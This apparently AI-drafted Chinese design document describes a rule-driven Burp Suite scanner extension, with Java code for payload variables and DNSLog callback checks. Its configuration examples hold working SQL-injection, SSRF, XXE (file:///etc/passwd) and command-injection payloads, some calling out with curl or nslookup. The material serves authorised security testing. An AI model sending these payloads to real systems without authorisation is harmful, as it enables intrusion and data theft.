# 通用扫描器架构 - 完全规则驱动

> **核心理念**: 不在代码中区分漏洞类型，所有检测逻辑由配置规则决定  
> **设计日期**: 2025-10-01

---

## 🎯 核心思想

### 传统方案（硬编码）❌

```
SQLScanner.java    → 发送SQL payload → 检查SQL错误信息
LFIScanner.java    → 发送LFI payload → 检查文件内容
SSRFScanner.java   → 发送SSRF payload → 检查响应特征
XSSScanner.java    → 发送XSS payload → 检查反射内容
```

**问题**：
- 每种漏洞需要一个Scanner类
- 添加新类型需要写代码
- 检测逻辑硬编码在代码中

---

### 通用方案（规则驱动）✅

```
UniversalScanner.java
  ↓
  根据配置：
  1. 构建请求（注入payload）
  2. 发送请求
  3. 根据规则评估响应
  4. 返回结果
```

**优势**：
- ✅ 只需要一个通用Scanner
- ✅ 所有漏洞类型通过配置定义
- ✅ 支持任意自定义检测逻辑

---

## 🔧 关键设计：Payload变量系统

### 动态变量支持

让payload支持动态值，特别是DNSLog：

```java
支持的变量：
{{DNSLOG}}         - DNSLog域名（从配置获取）
{{RANDOM_STRING}}  - 随机字符串
{{RANDOM_NUMBER}}  - 随机数字
{{TIMESTAMP}}      - 时间戳
{{BASE64:xxx}}     - Base64编码
{{URL_ENCODE:xxx}} - URL编码
{{UUID}}           - UUID
```

### 使用示例

#### SQL注入（传统响应匹配）
```yaml
Payload:
  - ' OR 1=1--
  - ' AND SLEEP(5)--

匹配规则:
  - Response Body Contains "SQL syntax"
  - Response Time Greater Than 5000
```

#### SSRF（使用DNSLog）
```yaml
Payload:
  - http://{{DNSLOG}}/ssrf_test
  - http://{{DNSLOG}}.{{RANDOM_STRING}}
  - file:///etc/passwd

匹配规则:
  - DNSLog Received     (检查是否收到DNS请求)
  - Response Body Contains "root:"
```

#### XXE（使用DNSLog）
```yaml
Payload:
  - <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{{DNSLOG}}">]><foo>&xxe;</foo>
  - <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{{DNSLOG}}/xxe">]><foo>&xxe;</foo>

匹配规则:
  - DNSLog Received
  - Response Body Contains "[fonts]"
```

---

## 💻 实现设计

### 1. Payload变量解析器

```java
package com.xprobe.scanner.core;

import java.util.UUID;
import java.util.Base64;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Payload变量解析器
 * 
 * 支持在payload中使用动态变量：
 * - {{DNSLOG}} - DNSLog域名
 * - {{RANDOM_STRING}} - 随机字符串
 * - {{RANDOM_NUMBER}} - 随机数字
 * - {{TIMESTAMP}} - 时间戳
 * - {{UUID}} - UUID
 * - {{BASE64:xxx}} - Base64编码
 * - {{URL_ENCODE:xxx}} - URL编码
 */
public class PayloadVariableResolver {
    
    private static final Pattern VARIABLE_PATTERN = Pattern.compile("\\{\\{([^}]+)\\}\\}");
    
    private final String dnslogDomain;  // DNSLog域名（从配置获取）
    
    public PayloadVariableResolver(String dnslogDomain) {
        this.dnslogDomain = dnslogDomain;
    }
    
    /**
     * 解析payload中的变量
     * 
     * @param payload 原始payload
     * @return 解析后的payload和上下文信息
     */
    public PayloadContext resolvePayload(String payload) {
        if (payload == null || !payload.contains("{{")) {
            return new PayloadContext(payload, new HashMap<>());
        }
        
        String resolved = payload;
        Map<String, String> context = new HashMap<>();
        
        Matcher matcher = VARIABLE_PATTERN.matcher(payload);
        
        while (matcher.find()) {
            String variable = matcher.group(1);
            String value = resolveVariable(variable, context);
            resolved = resolved.replace("{{" + variable + "}}", value);
        }
        
        return new PayloadContext(resolved, context);
    }
    
    /**
     * 解析单个变量
     */
    private String resolveVariable(String variable, Map<String, String> context) {
        // 检查是否是函数式变量（如 BASE64:xxx）
        if (variable.contains(":")) {
            String[] parts = variable.split(":", 2);
            String function = parts[0];
            String argument = parts[1];
            
            switch (function) {
                case "BASE64":
                    return Base64.getEncoder().encodeToString(
                        argument.getBytes(StandardCharsets.UTF_8)
                    );
                    
                case "URL_ENCODE":
                    try {
                        return URLEncoder.encode(argument, StandardCharsets.UTF_8.toString());
                    } catch (Exception e) {
                        return argument;
                    }
                    
                default:
                    return "{{" + variable + "}}";  // 未知函数，保持原样
            }
        }
        
        // 简单变量
        switch (variable) {
            case "DNSLOG":
                // 生成唯一的子域名用于追踪
                String subdomain = generateUniqueSubdomain();
                context.put("dnslog_subdomain", subdomain);
                context.put("dnslog_full", subdomain + "." + dnslogDomain);
                return subdomain + "." + dnslogDomain;
                
            case "RANDOM_STRING":
                String randomStr = generateRandomString(8);
                context.put("random_string", randomStr);
                return randomStr;
                
            case "RANDOM_NUMBER":
                String randomNum = String.valueOf(System.currentTimeMillis() % 100000);
                context.put("random_number", randomNum);
                return randomNum;
                
            case "TIMESTAMP":
                String timestamp = String.valueOf(System.currentTimeMillis());
                context.put("timestamp", timestamp);
                return timestamp;
                
            case "UUID":
                String uuid = UUID.randomUUID().toString();
                context.put("uuid", uuid);
                return uuid;
                
            default:
                return "{{" + variable + "}}";  // 未知变量，保持原样
        }
    }
    
    /**
     * 生成唯一的子域名（用于DNSLog追踪）
     */
    private String generateUniqueSubdomain() {
        // 格式: xprobe-{timestamp}-{random}
        long timestamp = System.currentTimeMillis() % 1000000;
        String random = generateRandomString(4);
        return "xprobe-" + timestamp + "-" + random;
    }
    
    /**
     * 生成随机字符串
     */
    private String generateRandomString(int length) {
        String chars = "abcdefghijklmnopqrstuvwxyz0123456789";
        StringBuilder sb = new StringBuilder();
        java.util.Random random = new java.util.Random();
        
        for (int i = 0; i < length; i++) {
            sb.append(chars.charAt(random.nextInt(chars.length())));
        }
        
        return sb.toString();
    }
    
    /**
     * Payload上下文（包含解析后的payload和变量值）
     */
    public static class PayloadContext {
        private final String resolvedPayload;
        private final Map<String, String> variables;
        
        public PayloadContext(String resolvedPayload, Map<String, String> variables) {
            this.resolvedPayload = resolvedPayload;
            this.variables = variables;
        }
        
        public String getResolvedPayload() {
            return resolvedPayload;
        }
        
        public Map<String, String> getVariables() {
            return variables;
        }
        
        /**
         * 获取DNSLog子域名（如果使用了DNSLOG变量）
         */
        public String getDnslogSubdomain() {
            return variables.get("dnslog_subdomain");
        }
        
        /**
         * 获取完整的DNSLog域名
         */
        public String getDnslogFull() {
            return variables.get("dnslog_full");
        }
        
        /**
         * 是否使用了DNSLog
         */
        public boolean usesDnslog() {
            return variables.containsKey("dnslog_subdomain");
        }
    }
}
```

---

### 2. DNSLog集成

```java
package com.xprobe.scanner.integration;

import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ConcurrentHashMap;
import java.util.Map;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;

/**
 * DNSLog集成
 * 
 * 支持多种DNSLog平台：
 * - dnslog.cn
 * - ceye.io
 * - interact.sh (Burp Collaborator)
 * - 自定义DNSLog服务
 */
public class DnslogIntegration {
    
    private final String dnslogDomain;
    private final String dnslogApiUrl;
    private final String dnslogToken;
    private final DnslogProvider provider;
    
    // 缓存DNSLog记录（subdomain -> 是否收到DNS请求）
    private final Map<String, Boolean> dnslogCache = new ConcurrentHashMap<>();
    
    public enum DnslogProvider {
        DNSLOG_CN,      // dnslog.cn
        CEYE_IO,        // ceye.io
        INTERACT_SH,    // interact.sh (Burp Collaborator)
        CUSTOM          // 自定义
    }
    
    public DnslogIntegration(String dnslogDomain, String dnslogApiUrl, 
                            String dnslogToken, DnslogProvider provider) {
        this.dnslogDomain = dnslogDomain;
        this.dnslogApiUrl = dnslogApiUrl;
        this.dnslogToken = dnslogToken;
        this.provider = provider;
    }
    
    /**
     * 检查是否收到DNS请求
     * 
     * @param subdomain 子域名（如: xprobe-123456-abcd）
     * @return true 如果收到DNS请求
     */
    public boolean checkDnslogReceived(String subdomain) {
        // 先检查缓存
        if (dnslogCache.containsKey(subdomain)) {
            return dnslogCache.get(subdomain);
        }
        
        // 调用DNSLog API检查
        boolean received = checkDnslogFromApi(subdomain);
        
        // 缓存结果
        dnslogCache.put(subdomain, received);
        
        return received;
    }
    
    /**
     * 从API检查DNSLog记录
     */
    private boolean checkDnslogFromApi(String subdomain) {
        try {
            switch (provider) {
                case DNSLOG_CN:
                    return checkDnslogCn(subdomain);
                    
                case CEYE_IO:
                    return checkCeyeIo(subdomain);
                    
                case INTERACT_SH:
                    return checkInteractSh(subdomain);
                    
                case CUSTOM:
                    return checkCustomDnslog(subdomain);
                    
                default:
                    return false;
            }
        } catch (Exception e) {
            return false;
        }
    }
    
    /**
     * 检查 dnslog.cn
     */
    private boolean checkDnslogCn(String subdomain) throws Exception {
        // dnslog.cn API
        String apiUrl = dnslogApiUrl + "?domain=" + subdomain + "." + dnslogDomain;
        
        URL url = new URL(apiUrl);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(5000);
        
        int responseCode = conn.getResponseCode();
        if (responseCode == 200) {
            // 读取响应
            java.io.BufferedReader reader = new java.io.BufferedReader(
                new java.io.InputStreamReader(conn.getInputStream())
            );
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();
            
            // 检查是否有记录
            return response.length() > 0 && !response.toString().equals("[]");
        }
        
        return false;
    }
    
    /**
     * 检查 ceye.io
     */
    private boolean checkCeyeIo(String subdomain) throws Exception {
        // ceye.io API
        // http://api.ceye.io/v1/records?token=xxx&type=dns&filter=subdomain
        String apiUrl = String.format("%s?token=%s&type=dns&filter=%s",
            dnslogApiUrl, dnslogToken, subdomain);
        
        URL url = new URL(apiUrl);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(5000);
        
        int responseCode = conn.getResponseCode();
        if (responseCode == 200) {
            java.io.BufferedReader reader = new java.io.BufferedReader(
                new java.io.InputStreamReader(conn.getInputStream())
            );
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();
            
            // 解析JSON响应
            ObjectMapper mapper = new ObjectMapper();
            JsonNode root = mapper.readTree(response.toString());
            
            // 检查是否有DNS记录
            JsonNode data = root.get("data");
            return data != null && data.size() > 0;
        }
        
        return false;
    }
    
    /**
     * 检查 interact.sh (Burp Collaborator)
     */
    private boolean checkInteractSh(String subdomain) throws Exception {
        // interact.sh API
        String apiUrl = dnslogApiUrl + "/poll?biid=" + subdomain;
        
        URL url = new URL(apiUrl);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(5000);
        
        int responseCode = conn.getResponseCode();
        if (responseCode == 200) {
            java.io.BufferedReader reader = new java.io.BufferedReader(
                new java.io.InputStreamReader(conn.getInputStream())
            );
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();
            
            // 解析JSON响应
            ObjectMapper mapper = new ObjectMapper();
            JsonNode root = mapper.readTree(response.toString());
            
            // 检查是否有交互记录
            JsonNode interactions = root.get("data");
            return interactions != null && interactions.size() > 0;
        }
        
        return false;
    }
    
    /**
     * 检查自定义DNSLog服务
     */
    private boolean checkCustomDnslog(String subdomain) throws Exception {
        // 自定义DNSLog API（根据实际API格式调整）
        String apiUrl = dnslogApiUrl + "?subdomain=" + subdomain;
        
        URL url = new URL(apiUrl);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        
        if (dnslogToken != null && !dnslogToken.isEmpty()) {
            conn.setRequestProperty("Authorization", "Bearer " + dnslogToken);
        }
        
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(5000);
        
        return conn.getResponseCode() == 200;
    }
    
    /**
     * 清除缓存
     */
    public void clearCache() {
        dnslogCache.clear();
    }
    
    /**
     * 获取DNSLog域名
     */
    public String getDnslogDomain() {
        return dnslogDomain;
    }
}
```

---

### 3. 增强的响应匹配规则

```java
public class Configuration {
    
    /**
     * 匹配规则（增强版，支持DNSLog）
     */
    public static class MatchRule implements Serializable {
        private String location;         // 匹配位置
        private String matchType;        // 匹配类型
        private String rule;             // 规则值
        private String operator;         // 逻辑操作符
        
        /**
         * 匹配位置（新增DNSLog支持）:
         * - Response Body
         * - Response Headers
         * - Status Code
         * - Response Time
         * - Response Length
         * - DNSLog Received        ← 新增
         * - HTTP Callback Received ← 新增（用于HTTP请求回连）
         */
        
        /**
         * 匹配类型:
         * 对于 DNSLog Received:
         * - "Received" (收到DNS请求)
         * - "Not Received" (未收到DNS请求)
         * - "Received Within Time" (在指定时间内收到)
         */
        
        // Getter/Setter...
    }
}
```

---

### 4. 通用扫描器（完全版）

```java
package com.xprobe.scanner.scanners;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import com.xprobe.scanner.config.Configuration;
import com.xprobe.scanner.core.InjectionPointExecutor;
import com.xprobe.scanner.core.PayloadVariableResolver;
import com.xprobe.scanner.integration.DnslogIntegration;
import com.xprobe.scanner.models.ScanResult;
import com.xprobe.scanner.models.ScanTask;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CompletableFuture;

/**
 * 通用扫描器（完全规则驱动）
 * 
 * 不再区分SQL、LFI、SSRF等类型，完全基于配置规则执行扫描
 * 
 * 支持：
 * - 灵活的注入点
 * - 动态Payload变量（DNSLOG、RANDOM等）
 * - 多种响应匹配方式（包括DNSLog）
 * - 完全可配置
 */
public class UniversalScanner implements Scanner {
    
    private final MontoyaApi api;
    private final DnslogIntegration dnslogIntegration;
    
    public UniversalScanner(MontoyaApi api, DnslogIntegration dnslogIntegration) {
        this.api = api;
        this.dnslogIntegration = dnslogIntegration;
    }
    
    @Override
    public String getType() {
        return "*";  // 通配符，支持所有类型
    }
    
    @Override
    public String getName() {
        return "Universal Scanner";
    }
    
    @Override
    public String getDescription() {
        return "通用规则驱动扫描器，支持所有漏洞类型";
    }
    
    @Override
    public boolean canScan(ScanTask task) {
        Configuration config = task.getConfiguration();
        
        if (config == null || !config.isEnabled()) {
            return false;
        }
        
        // 检查注入点和payload
        return config.getInjectionPoints() != null && 
               !config.getInjectionPoints().isEmpty() &&
               config.getPayloads() != null && 
               !config.getPayloads().isEmpty();
    }
    
    @Override
    public CompletableFuture<List<ScanResult>> scan(ScanTask task) {
        return CompletableFuture.supplyAsync(() -> {
            List<ScanResult> results = new ArrayList<>();
            Configuration config = task.getConfiguration();
            HttpRequest originalRequest = task.getRequest().copyToTempFile();
            
            // 创建Payload解析器
            PayloadVariableResolver resolver = new PayloadVariableResolver(
                dnslogIntegration.getDnslogDomain()
            );
            
            api.logging().raiseInfoEvent(String.format(
                "开始扫描 [%s]: %s %s",
                config.getCustomLabel(),
                originalRequest.method(),
                originalRequest.path()
            ));
            
            // 对每个payload进行测试
            for (String rawPayload : config.getPayloads()) {
                try {
                    // 解析payload中的变量
                    PayloadVariableResolver.PayloadContext payloadContext = 
                        resolver.resolvePayload(rawPayload);
                    String resolvedPayload = payloadContext.getResolvedPayload();
                    
                    // 应用注入点
                    HttpRequest modifiedRequest = InjectionPointExecutor.applyInjections(
                        originalRequest,
                        config.getInjectionPoints(),
                        resolvedPayload
                    );
                    
                    // 发送请求
                    long startTime = System.currentTimeMillis();
                    HttpRequestResponse requestResponse = api.http().sendRequest(modifiedRequest);
                    HttpResponse response = requestResponse.response();
                    long responseTime = System.currentTimeMillis() - startTime;
                    
                    // 如果使用了DNSLog，等待一段时间让DNS解析完成
                    if (payloadContext.usesDnslog()) {
                        api.logging().raiseDebugEvent(
                            "使用了DNSLog，等待DNS解析... 子域名: " + 
                            payloadContext.getDnslogSubdomain()
                        );
                        Thread.sleep(3000);  // 等待3秒
                    }
                    
                    // 评估响应
                    boolean isVulnerable = evaluateResponse(
                        response,
                        responseTime,
                        payloadContext,
                        config.getMatchRules()
                    );
                    
                    if (isVulnerable) {
                        ScanResult result = new ScanResult.Builder()
                            .vulnerable(true)
                            .scanType(config.getCustomLabel())
                            .parameterName(describeInjectionPoints(config.getInjectionPoints()))
                            .payload(rawPayload + " → " + resolvedPayload)
                            .originalRequest(originalRequest)
                            .modifiedRequest(modifiedRequest)
                            .response(response)
                            .responseTime(responseTime)
                            .evidence(buildEvidence(response, payloadContext, config.getMatchRules()))
                            .build();
                        
                        results.add(result);
                        
                        api.logging().raiseInfoEvent(String.format(
                            "✅ 发现漏洞 [%s]: %s",
                            config.getCustomLabel(), rawPayload
                        ));
                    }
                    
                } catch (Exception e) {
                    api.logging().raiseErrorEvent(String.format(
                        "扫描出错 [%s]: %s",
                        config.getCustomLabel(), e.getMessage()
                    ));
                }
            }
            
            return results;
        });
    }
    
    /**
     * 评估响应（支持DNSLog）
     */
    private boolean evaluateResponse(HttpResponse response,
                                     long responseTime,
                                     PayloadVariableResolver.PayloadContext payloadContext,
                                     List<Configuration.MatchRule> matchRules) {
        if (matchRules == null || matchRules.isEmpty()) {
            return false;
        }
        
        boolean result = evaluateSingleRule(
            matchRules.get(0), response, responseTime, payloadContext
        );
        
        for (int i = 1; i < matchRules.size(); i++) {
            Configuration.MatchRule rule = matchRules.get(i);
            boolean ruleResult = evaluateSingleRule(rule, response, responseTime, payloadContext);
            
            if ("OR".equalsIgnoreCase(rule.getOperator())) {
                result = result || ruleResult;
            } else if ("AND".equalsIgnoreCase(rule.getOperator())) {
                result = result && ruleResult;
            }
        }
        
        return result;
    }
    
    /**
     * 评估单个规则（新增DNSLog支持）
     */
    private boolean evaluateSingleRule(Configuration.MatchRule rule,
                                      HttpResponse response,
                                      long responseTime,
                                      PayloadVariableResolver.PayloadContext payloadContext) {
        String location = rule.getLocation();
        String matchType = rule.getMatchType();
        String ruleValue = rule.getRule();
        
        try {
            switch (location) {
                case "Response Body":
                    return evaluateBodyMatch(response.bodyToString(), matchType, ruleValue);
                    
                case "Response Headers":
                    return evaluateHeadersMatch(response.toString(), matchType, ruleValue);
                    
                case "Status Code":
                    return evaluateStatusCodeMatch(response.statusCode(), matchType, ruleValue);
                    
                case "Response Time":
                    return evaluateResponseTimeMatch(responseTime, matchType, ruleValue);
                    
                case "Response Length":
                    return evaluateResponseLengthMatch(response.body().length(), matchType, ruleValue);
                    
                // ✅ 新增：DNSLog匹配
                case "DNSLog Received":
                    return evaluateDnslogMatch(payloadContext, matchType, ruleValue);
                    
                default:
                    api.logging().raiseErrorEvent("未知的匹配位置: " + location);
                    return false;
            }
        } catch (Exception e) {
            api.logging().raiseErrorEvent("规则评估出错: " + e.getMessage());
            return false;
        }
    }
    
    /**
     * 评估DNSLog匹配
     */
    private boolean evaluateDnslogMatch(PayloadVariableResolver.PayloadContext payloadContext,
                                       String matchType,
                                       String ruleValue) {
        if (!payloadContext.usesDnslog()) {
            // 没有使用DNSLog变量，无法检查
            return false;
        }
        
        String subdomain = payloadContext.getDnslogSubdomain();
        boolean received = dnslogIntegration.checkDnslogReceived(subdomain);
        
        switch (matchType) {
            case "Received":
                return received;
                
            case "Not Received":
                return !received;
                
            case "Received Within Time":
                // 已经在发送请求后等待了指定时间
                return received;
                
            default:
                return false;
        }
    }
    
    /**
     * 评估响应体匹配（从之前的实现复制）
     */
    private boolean evaluateBodyMatch(String body, String matchType, String ruleValue) {
        switch (matchType) {
            case "Contains":
                return body.contains(ruleValue);
            case "Regex Match":
                return body.matches(ruleValue);
            case "Starts With":
                return body.startsWith(ruleValue);
            case "Ends With":
                return body.endsWith(ruleValue);
            case "Not Contains":
                return !body.contains(ruleValue);
            default:
                return false;
        }
    }
    
    // ... 其他评估方法（从之前的实现复制）
    
    /**
     * 构建证据
     */
    private String buildEvidence(HttpResponse response,
                                 PayloadVariableResolver.PayloadContext payloadContext,
                                 List<Configuration.MatchRule> matchRules) {
        StringBuilder evidence = new StringBuilder();
        evidence.append("匹配的规则:\n");
        
        for (Configuration.MatchRule rule : matchRules) {
            evidence.append(String.format("- [%s] %s: %s\n",
                rule.getLocation(), rule.getMatchType(), rule.getRule()));
        }
        
        if (payloadContext.usesDnslog()) {
            evidence.append("\nDNSLog信息:\n");
            evidence.append("- 子域名: ").append(payloadContext.getDnslogSubdomain()).append("\n");
            evidence.append("- 完整域名: ").append(payloadContext.getDnslogFull()).append("\n");
        }
        
        evidence.append("\n响应摘要:\n");
        evidence.append("- 状态码: ").append(response.statusCode()).append("\n");
        evidence.append("- 响应长度: ").append(response.body().length()).append(" bytes\n");
        
        return evidence.toString();
    }
    
    private String describeInjectionPoints(List<Configuration.InjectionPoint> points) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < points.size(); i++) {
            Configuration.InjectionPoint point = points.get(i);
            sb.append(point.getPointType());
            if (point.getTargetName() != null && !point.getTargetName().isEmpty()) {
                sb.append("(").append(point.getTargetName()).append(")");
            }
            if (i < points.size() - 1) {
                sb.append(", ");
            }
        }
        return sb.toString();
    }
    
    @Override
    public List<String> getPayloads() {
        return new ArrayList<>();
    }
}
```

---

## 🎨 配置示例

### 示例1: SSRF检测（使用DNSLog）

```yaml
规则名称: "SSRF漏洞检测 - DNSLog"

【请求匹配条件】
  - Parameter Name Contains "url"    [OR]
  - Parameter Name Contains "link"   [OR]
  - Parameter Name Contains "target"

【注入点】
  - Parameter Value [Replace]
    目标: url, link, target, callback

【Payload】
  - http://{{DNSLOG}}/ssrf_test
  - http://{{DNSLOG}}:8080/admin
  - //{{DNSLOG}}/redirect
  - https://{{DNSLOG}}/api
  
【响应匹配规则】
  - DNSLog Received [Received]
```

**效果**：
1. payload中的`{{DNSLOG}}`会被替换为`xprobe-123456-abcd.dnslog.cn`
2. 发送请求后，等待3秒
3. 检查是否收到DNS请求
4. 如果收到，标记为SSRF漏洞

---

### 示例2: SQL盲注（基于时间）

```yaml
规则名称: "SQL盲注 - 时间盲注"

【注入点】
  - Parameter Value [Append]
    目标: id, user_id, product_id

【Payload】
  - ' AND SLEEP(5)--
  - ' AND BENCHMARK(5000000,MD5(1))--
  - '; WAITFOR DELAY '00:00:05'--
  
【响应匹配规则】
  - Response Time [Greater Than] [5000]
```

---

### 示例3: XXE检测（DNSLog + 文件读取）

```yaml
规则名称: "XXE外部实体注入"

【请求匹配条件】
  - Content-Type [Contains] [xml]

【注入点】
  - Request Body [Insert At Marker]
    标记: §PAYLOAD§

请求体模板:
<?xml version="1.0"?>
§PAYLOAD§
<data>
  <user>test</user>
</data>

【Payload】
  - <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{{DNSLOG}}/xxe">]>
  - <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  - <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{{DNSLOG}}/xxe.dtd">]>
  
【响应匹配规则】
  - DNSLog Received [Received]           [OR]
  - Response Body [Contains] [root:]     [OR]
  - Response Body [Regex] [root:.*:0:0:]
```

---

### 示例4: 命令注入（多种检测方式）

```yaml
规则名称: "命令注入检测"

【注入点】
  - Parameter Value [Append]
    目标: cmd, command, exec, system

【Payload】
  - ; curl http://{{DNSLOG}}/cmd
  - | nslookup {{DNSLOG}}
  - `ping -c 3 {{DNSLOG}}`
  - ; sleep 5
  - && whoami
  
【响应匹配规则】
  - DNSLog Received [Received]              [OR]
  - Response Time [Greater Than] [5000]     [OR]
  - Response Body [Contains] [root]         [OR]
  - Response Body [Contains] [www-data]
```

---

## 📊 架构对比

### 旧架构（硬编码）

```
src/main/java/com/xprobe/scanner/scanners/
  ├── Scanner.java (接口)
  ├── AbstractScanner.java
  ├── SQLScanner.java        ← 需要写代码
  ├── LFIScanner.java        ← 需要写代码
  ├── SSRFScanner.java       ← 需要写代码
  ├── XSSScanner.java        ← 需要写代码
  ├── XXEScanner.java        ← 需要写代码
  └── ScannerFactory.java    ← 需要注册
```

### 新架构（规则驱动）

```
src/main/java/com/xprobe/scanner/scanners/
  ├── Scanner.java (接口)
  └── UniversalScanner.java  ← 只需要这一个！

src/main/java/com/xprobe/scanner/core/
  ├── PayloadVariableResolver.java    (Payload变量解析)
  ├── DeduplicationKeyGenerator.java  (去重)
  ├── InjectionPointExecutor.java     (注入点执行)
  └── RequestConditionEvaluator.java  (条件评估)

src/main/java/com/xprobe/scanner/integration/
  └── DnslogIntegration.java          (DNSLog集成)
```

**代码减少 60%！**

---

## 🎯 总结

### 核心优势

| 特性 | 旧方案 | 新方案 |
|------|--------|--------|
| 添加新漏洞类型 | 写代码+编译 | UI配置 |
| 支持DNSLog | 硬编码在SSRF扫描器 | 所有类型都支持 |
| 代码维护 | 多个Scanner类 | 只有一个 |
| 灵活性 | 低 | 极高 |
| 学习成本 | 需要懂Java | 只需懂规则 |

### 支持的所有功能

✅ **注入点**: 参数、Header、Body、Path、Cookie等任意位置  
✅ **条件匹配**: Content-Type、URL、Method等多条件组合  
✅ **动态Payload**: DNSLog、随机值、编码等  
✅ **响应匹配**: Body、Header、状态码、时间、DNSLog等  
✅ **去重策略**: 基于规则ID的智能去重  
✅ **规则管理**: 导入导出、复制、版本管理  

### 完全不需要硬编码的漏洞类型

❌ SQLScanner.java - 删除  
❌ LFIScanner.java - 删除  
❌ SSRFScanner.java - 删除  
❌ XSSScanner.java - 删除  
❌ XXEScanner.java - 删除  

✅ UniversalScanner.java - 一个搞定！

---

**这就是最终的架构！要我现在开始实施吗？**

